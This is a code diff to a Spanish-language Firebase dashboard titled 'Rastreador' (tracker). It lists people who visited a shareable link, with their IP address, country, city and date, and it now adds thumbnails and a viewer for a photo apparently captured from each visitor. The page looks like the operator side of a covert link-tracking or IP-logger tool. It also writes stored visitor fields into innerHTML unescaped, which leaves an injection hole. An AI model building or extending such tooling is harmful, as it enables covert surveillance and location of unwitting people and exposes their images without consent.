@@ -8,6 +8,59 @@
     <meta name="theme-color" content="#4f46e5">
     <title>Rastreador - Active Server</title>
     <link rel="stylesheet" href="style.css">
+    <style>
+        .photo-thumb {
+            width: 50px;
+            height: 50px;
+            object-fit: cover;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .photo-thumb:hover {
+            transform: scale(1.1);
+            box-shadow: var(--shadow-md);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            max-width: 90%;
+            max-height: 90%;
+            border-radius: 8px;
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 20px;
+            right: 40px;
+            color: #fff;
+            font-size: 40px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .no-photo {
+            color: #94a3b8;
+            font-size: 12px;
+        }
+    </style>
 </head>
 
 <body>
@@ -36,14 +89,15 @@
             <table>
                 <thead>
                     <tr>
-                        <th>IP</th>
+                        <th>Foto</th>
+                        <th>IP / País</th>
                         <th>Ciudad</th>
                         <th>Fecha</th>
                     </tr>
                 </thead>
                 <tbody id="list">
                     <tr>
-                        <td colspan="3" style="text-align:center;">
+                        <td colspan="4" style="text-align:center;">
                             <span class="loading"></span> Cargando...
                         </td>
                     </tr>
@@ -52,13 +106,21 @@
         </div>
     </div>
 
+    <!-- Modal for photo preview -->
+    <div id="photoModal" class="modal">
+        <span class="modal-close" onclick="closeModal()">&times;</span>
+        <img id="modalImage" class="modal-content">
+    </div>
+
     <script type="module">
         import { auth, db, ref, onValue, remove } from './firebase-config.js';
+        import { getStorage, ref as storageRef, getDownloadURL } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js';
 
         const txtLink = document.getElementById('myLink');
         const tableList = document.getElementById('list');
         const btnCopy = document.getElementById('btn-copy');
         const btnDelete = document.getElementById('btn-del');
+        const storage = getStorage();
 
         auth.onAuthStateChanged(u => {
             if (!u) {
@@ -72,13 +134,13 @@
 
             // 2. Listen for visits
             const visitasRef = ref(db, `visitas/${u.uid}`);
-            onValue(visitasRef, (snap) => {
+            onValue(visitasRef, async (snap) => {
                 tableList.innerHTML = "";
 
                 if (!snap.exists()) {
                     tableList.innerHTML = `
                         <tr>
-                            <td colspan='3' style='text-align:center; padding:24px; color:#94a3b8;'>
+                            <td colspan='4' style='text-align:center; padding:24px; color:#94a3b8;'>
                                 No hay visitas registradas aún
                             </td>
                         </tr>
@@ -86,17 +148,37 @@
                     return;
                 }
 
+                const visits = [];
                 snap.forEach(child => {
-                    const v = child.val();
+                    visits.push({ key: child.key, ...child.val() });
+                });
+
+                // Sort by timestamp (newest first)
+                visits.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+
+                for (const v of visits) {
+                    let photoHTML = '<span class="no-photo">Sin foto</span>';
+
+                    if (v.foto) {
+                        try {
+                            const photoRef = storageRef(storage, v.foto);
+                            const photoURL = await getDownloadURL(photoRef);
+                            photoHTML = `<img src="${photoURL}" class="photo-thumb" onclick="showPhoto('${photoURL}')" alt="Foto">`;
+                        } catch (err) {
+                            console.error('Error loading photo:', err);
+                        }
+                    }
+
                     const row = `
                         <tr>
-                            <td><strong>${v.ip || 'N/A'}</strong></td>
+                            <td>${photoHTML}</td>
+                            <td><strong>${v.ip || 'N/A'}</strong><br><small style="color:#94a3b8;">${v.pais || ''}</small></td>
                             <td>${v.ciudad || 'Desconocida'}</td>
                             <td>${v.fecha || 'N/A'}</td>
                         </tr>
                     `;
-                    tableList.innerHTML = row + tableList.innerHTML; // Newest first
-                });
+                    tableList.innerHTML += row;
+                }
             });
 
             // 3. Configure buttons
@@ -129,6 +211,23 @@
                 }
             };
         });
+
+        // Modal functions
+        window.showPhoto = function (url) {
+            document.getElementById('modalImage').src = url;
+            document.getElementById('photoModal').classList.add('active');
+        };
+
+        window.closeModal = function () {
+            document.getElementById('photoModal').classList.remove('active');
+        };
+
+        // Close modal on click outside
+        document.getElementById('photoModal').onclick = function (e) {
+            if (e.target === this) {
+                closeModal();
+            }
+        };
     </script>
 </body>
 
